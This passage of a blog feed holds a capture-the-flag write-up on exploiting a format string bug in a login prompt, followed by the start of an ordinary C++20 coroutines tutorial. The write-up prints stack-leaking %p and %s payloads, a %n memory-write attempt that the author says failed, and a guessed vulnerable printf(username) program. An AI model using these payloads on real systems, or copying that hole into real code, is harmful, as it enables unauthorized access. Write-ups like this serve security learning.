+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice! I&amp;rsquo;m guessing the flag is stored as a character array somewhere in the program&amp;rsquo;s data section, and hopefully, there&amp;rsquo;s a pointer to that string somewhere on the stack, so I print out all the pointers I can.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
+password: 
+
+Welcome 0x20656d6f636c6557 0x6b5600 0x20656d6f636c6557 0x6b7880 0x8
+0x7fffffffeb00 0x7fffffffec00 0x3433647b46544351 0x7d723474736874
+0x7fffffffeac0 0x6b4bc0 0x7fffffffed10 0x400dea 0x7fffffffee58
+0x1006b81c0 (nil) 0x5 0x45 0x70 0x1 0x3100000005 (nil) (nil)
+0x6e0000005b (nil) (nil) 0x7c00000077 0x6b3800 0x6b3800 0x45 0x1
+0x7fffffffebc0 (nil) 0x2 0x413d61 0x2 0x4 0x7fffffffec80 0x460bdb
+0x7fffffffefc9 (nil) 0x49e4d1 0x15 0x140 0x170 0x5 0x3500000015
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 .
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Wow, that&amp;rsquo;s a lot of data! I used vim to clean in up into a form that I can import into my hex editor, and I start looking for things that might look like pointers.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nmilo.net/qctf/hexfiend.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Of course, on the right we have the format string, since it must be loaded onto the stack too while printf is being executed, and, wait, what is that above? FTCQ? I happen to know that flags have the format QCTF{&amp;hellip;}, and since we&amp;rsquo;re in little endian it will appear reversed. So the flag isn&amp;rsquo;t stored in a &lt;code&gt;char *&lt;/code&gt;, it&amp;rsquo;s stored directly on the stack. We can try a new query, but I&amp;rsquo;m just gonna reverse the bytes manually. Converting &lt;code&gt;3433647B46544351 007D723474736874&lt;/code&gt; to big-endian gives &lt;code&gt;514354467B643334 7468737434727D00&lt;/code&gt;, which is &lt;code&gt;QCTF{d34thst4r}&lt;/code&gt; in ASCII. And that&amp;rsquo;s the flag!&lt;/p&gt;
+&lt;h2 id=&#34;death-string-2&#34;&gt;Death String 2&lt;/h2&gt;
+&lt;p&gt;This challenge reuses the same login prompt from Death String 1 but now we need to find a way to log in using the mentioned &amp;ldquo;emergency override code.&amp;rdquo; We&amp;rsquo;re also given the hint that &amp;ldquo;A pointer to the emergency access code is stored in a stack variable.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Stack variable have very distinct patterns, and on this machine, I&amp;rsquo;m guessing pointers to the stack generally start at &lt;code&gt;0x7fffffff0000&lt;/code&gt;. So I look at the prompt I used above and replace every &lt;code&gt;%p&lt;/code&gt; with a &lt;code&gt;%s&lt;/code&gt; to print the content of each stack-pointer as a string, which lets me fill out this table:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;position in the format string&lt;/th&gt;
+&lt;th&gt;pointer value&lt;/th&gt;
+&lt;th&gt;content as string&lt;/th&gt;
+&lt;th&gt;guess&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;6&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEB00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;empty string or non-printable characters&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;7&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEC00&lt;/td&gt;
+&lt;td&gt;%p %p %p %p %p &amp;ldquo;%s&amp;rdquo; &amp;ldquo;%s&amp;rdquo; %p %p &amp;ldquo;%s&amp;rdquo; %p &amp;ldquo;%s&amp;rdquo; %p &amp;ldquo;%s&amp;rdquo; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p &amp;ldquo;%s&amp;rdquo; %p %p %p %p %p &amp;ldquo;%s&amp;rdquo; %p &amp;ldquo;%s&amp;rdquo; %p %p %p %p %p %p %p %p %p %p %p %p&lt;/td&gt;
+&lt;td&gt;pointer to the format string&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEAC0&lt;/td&gt;
+&lt;td&gt;QCTF{d34thst4r}&lt;/td&gt;
+&lt;td&gt;flag 1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;12&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFED10&lt;/td&gt;
+&lt;td&gt;0k&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;14&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEE58&lt;/td&gt;
+&lt;td&gt;?????&lt;/td&gt;
+&lt;td&gt;GNU printf print failure? Or the literal string &amp;ldquo;?????&amp;rdquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;32&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEBC0&lt;/td&gt;
+&lt;td&gt;?????&lt;/td&gt;
+&lt;td&gt;same&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;38&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEC80&lt;/td&gt;
+&lt;td&gt;&amp;ldquo;%s&amp;rdquo; %p &amp;ldquo;%s&amp;rdquo; %p %p %p %p %p %p %p %p %p %p %p %p&lt;/td&gt;
+&lt;td&gt;portion of the format string&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;40&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEFC9&lt;/td&gt;
+&lt;td&gt;x86_64&lt;/td&gt;
+&lt;td&gt;architecture&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;A few notes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;so a pointer to flag 1 is indeed stored on the stack, we could have used this method to solve part 1&lt;/li&gt;
+&lt;li&gt;I&amp;rsquo;m guessing everything at pointer 32 and on is part of the printf function&amp;rsquo;s stack, so we&amp;rsquo;re not interested
+&lt;ul&gt;
+&lt;li&gt;considering it holds a substring of the format string, it likely has some logic like this,&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;char&lt;/span&gt; fmt, ...) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;format_the_specifier&lt;/span&gt;(fmt, args);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		fmt &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;+=&lt;/span&gt; length_of_specifier;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;this makes sense, since when it prints word 38, the &lt;code&gt;fmt&lt;/code&gt; pointer in the pseudocode above would on the 2nd last &lt;code&gt;&amp;quot;%s&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;x86_64&amp;quot;&lt;/code&gt; is likely part of printf too, maybe there&amp;rsquo;s some way to get printf to print the architecture? Or is this a GNU extension? Weird either way.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can get a cleaner version of the output above by using the prompt:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;%6$s&amp;#34; &amp;#34;%7$s&amp;#34; &amp;#34;%10$s&amp;#34; &amp;#34;%12$s&amp;#34; %14$s&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which takes advantage of printf&amp;rsquo;s rarely used positional formatting specifiers.&lt;/p&gt;
+&lt;p&gt;Hacking away with precision specifiers, and writing to the pointers with &lt;code&gt;%n&lt;/code&gt;, I can get a better understanding of what the pointers point to. And yes, at &lt;code&gt;0x7FFFFFFFEE58&lt;/code&gt; there really is a literal &lt;code&gt;&amp;quot;?????&amp;quot;&lt;/code&gt;, and that&amp;rsquo;s not part of &lt;code&gt;printf&lt;/code&gt;.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;position in the format string&lt;/th&gt;
+&lt;th&gt;pointer value&lt;/th&gt;
+&lt;th&gt;what it points to&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;6&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEB00&lt;/td&gt;
+&lt;td&gt;the password we type&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;7&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEC00&lt;/td&gt;
+&lt;td&gt;the username we type&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEAC0&lt;/td&gt;
+&lt;td&gt;&amp;ldquo;QCTF{d34thst4r}&amp;rdquo; (the flag)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;12&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFED10&lt;/td&gt;
+&lt;td&gt;&amp;ldquo;0k&amp;rdquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;14&lt;/td&gt;
+&lt;td&gt;0x00007FFFFFFFEE58&lt;/td&gt;
+&lt;td&gt;&amp;ldquo;?????&amp;rdquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Here I got stumped, so I got another hint, and it told me, &amp;ldquo;printf can write too,&amp;rdquo; which is something I already knew but still helpful since I now knew the challenge involved somehow overwriting the access code. My guess is that the program looks something like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;flag2 &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;...&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;char&lt;/span&gt; access_code_array[&lt;span style=&#34;color:#099&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;?????&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;username &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;username: &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;password &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;password: &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;access_code &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; access_code_array;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;Welcome &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;printf&lt;/span&gt;(username);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;strcmp&lt;/span&gt;(password, access_code) &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;strlen&lt;/span&gt;(access_code) &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// to prevent overwriting the access code with
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;								   &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// an empty string
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; access_code[&lt;span style=&#34;color:#099&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#d14&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// to prevent just typing &amp;#34;?????&amp;#34; into the
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;								   &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// password field
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;	) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;welcome, here&amp;#39;s the flag: %s&lt;/span&gt;&lt;span style=&#34;color:#d14&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;&lt;/span&gt;, flag2);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A little contrived, but it&amp;rsquo;s a CTF, what do you want. It&amp;rsquo;s clear I have to set the access code to something I know and then put that for the password. I use &lt;code&gt;%n&lt;/code&gt; to overwrite the code. &lt;code&gt;%n&lt;/code&gt; tells printf not to print the next pointer but instead treat it as an &lt;code&gt;int *&lt;/code&gt; and write to it the number of characters already written to &lt;code&gt;stdout&lt;/code&gt;. So I have to write, say, 65 characters to stdout, and then &lt;code&gt;%14$n&lt;/code&gt;, which writes a 65, or 0x41, or &amp;lsquo;A&amp;rsquo;, to the 14th pointer down the stack. Better yet, it will treat the &lt;code&gt;char *&lt;/code&gt; like an &lt;code&gt;int *&lt;/code&gt;, so it will actually write &lt;code&gt;0x00000041&lt;/code&gt;, which if interpreted as a character array on a little-endian machine, effectively writes &lt;code&gt;{0x41, 0, 0, 0}&lt;/code&gt;, which means I get the null-terminator written for free! So here&amp;rsquo;s my prompt, let&amp;rsquo;s hope it works:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username: aaaaa... (65 characters total) ...aaaaa%14$n
+password: A
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And&amp;hellip;. it didn&amp;rsquo;t work. It was at this point that time ran out and we disappointingly placed in 5th, when this 200-point challenge would have brought us to into the top 3 for that sweet, sweet cash prize. Oh well. Maybe the solution has something to do with that &lt;code&gt;0k&lt;/code&gt; string in pointer 12. I&amp;rsquo;ll have to wait and see the official solutions.&lt;/p&gt;
+</description>
+	</item>
+	
+	<item>
+		<title>C&#43;&#43;20 coroutines explained simply</title>
+		<link>https://nmilo.net/articles/coroutines/</link>
+		<pubDate>Thu, 12 May 2022 00:00:00 +0000</pubDate>
+		
+		<guid>https://nmilo.net/articles/coroutines/</guid>
+		<description>&lt;p&gt;C++20 brings coroutines to the language, and, like most things in C++, they are almost unnecessarily powerful and difficult to understand. C++20 also brings no standard coroutine-helper library, which means we have to write all the scheduling/handling code ourselves. Luckily, this gives us a great opportunity to understand how they work, so that when the libraries do come, we don&amp;rsquo;t just view them as compiler black magic.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-a-coroutine&#34;&gt;What is a coroutine?&lt;/h2&gt;
+&lt;p&gt;A coroutine is a function that can suspend its execution, return to the caller, and then later be resumed. We can use them to implement async/await, generators, and other useful patterns. In C++, we can declare coroutine by writing a function with the &lt;code&gt;co_await&lt;/code&gt;, &lt;code&gt;co_yield&lt;/code&gt;, or &lt;code&gt;co_return&lt;/code&gt; keywords anywhere in its body. For example, before even getting into implementation, let&amp;rsquo;s look at a coroutine we may want to write:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Task &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;my_coroutine&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; result &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;co_await&lt;/span&gt; my_async_function();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;co_yield&lt;/span&gt; result &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;co_return&lt;/span&gt; result &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;5&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Task task &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; my_coroutine();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    app.go_do_other_work();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    task.wait_until_ready();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; task.get_yielded_value() &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;endl;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    task.resume();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; task.get_returned_value() &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;endl;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What will we expect this coroutine to do? When we call &lt;code&gt;my_coroutine()&lt;/code&gt;, it should ideally do the following:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Go call &lt;code&gt;my_async_function&lt;/code&gt;, which in theory does some asynchronous work like reading a file. The coroutine is paused while the asynchronous function waits and the calling code goes and does some other work.&lt;/li&gt;
+&lt;li&gt;When &lt;code&gt;my_async_function&lt;/code&gt; is ready, the coroutine will be resumed, yields some computation to be read from &lt;code&gt;task.get_yielded_value()&lt;/code&gt;, and then pauses itself.&lt;/li&gt;
+&lt;li&gt;When the task is later resumed, it will return some other computation, ready to be read by &lt;code&gt;task.get_returned_value()&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Cool! Unfortunately, C++20 comes with no standard coroutine library so we&amp;rsquo;ll need to implement &lt;em&gt;all&lt;/em&gt; that functionality ourselves.&lt;/p&gt;
+&lt;h2 id=&#34;basic-coroutines&#34;&gt;Basic coroutines&lt;/h2&gt;
+&lt;p&gt;A coroutine has a few important, distinct objects associated with it:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;the &lt;em&gt;return type&lt;/em&gt;, which acts as the caller&amp;rsquo;s interface to the coroutine. All it is really required to do is define a typedef so the compiler can find the promise type. But here we&amp;rsquo;ll wrap all the coroutine logic behind it so all the caller is left with is a nice interface.&lt;/li&gt;
+&lt;li&gt;the &lt;em&gt;promise_type&lt;/em&gt;, which handles the logic for awaiting, yielding, and returning&lt;/li&gt;
+&lt;li&gt;the &lt;em&gt;std::coroutine_handle&lt;/em&gt;, which can be used to manipulate the coroutine from outside&lt;/li&gt;
+&lt;li&gt;the &lt;em&gt;state&lt;/em&gt;, which is a compiler internal and holds the state of the function&amp;rsquo;s arguments and local variables, usually on the heap
+&lt;ul&gt;
+&lt;li&gt;remember: if we can arbitrarily suspend and resume a function, then everything inside that function leaves the traditional idea of the &amp;ldquo;call stack&amp;rdquo;, and we can make the function live for as long as we want! Therefore the compiler needs to move all the variables to the heap and manually track lifetimes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s continue with the &lt;code&gt;my_coroutine&lt;/code&gt; example created above. When the coroutine is created, by calling &lt;code&gt;my_coroutine()&lt;/code&gt;, the compiler will do the following:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Construct the promise type, as defined by &lt;code&gt;Task::promise_type&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Create the return object using &lt;code&gt;promise.get_return_object()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;co_await&lt;/code&gt;&amp;rsquo;s the &lt;em&gt;Awaitable&lt;/em&gt; returned by &lt;code&gt;promise.initial_suspend()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Execute!&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;co_await&lt;/code&gt;&amp;rsquo;s the &lt;em&gt;Awaitable&lt;/em&gt; returned by &lt;code&gt;promise.final_suspend()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Destructs the promise.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;So already we have a few objects we need to define:&lt;/p&gt;
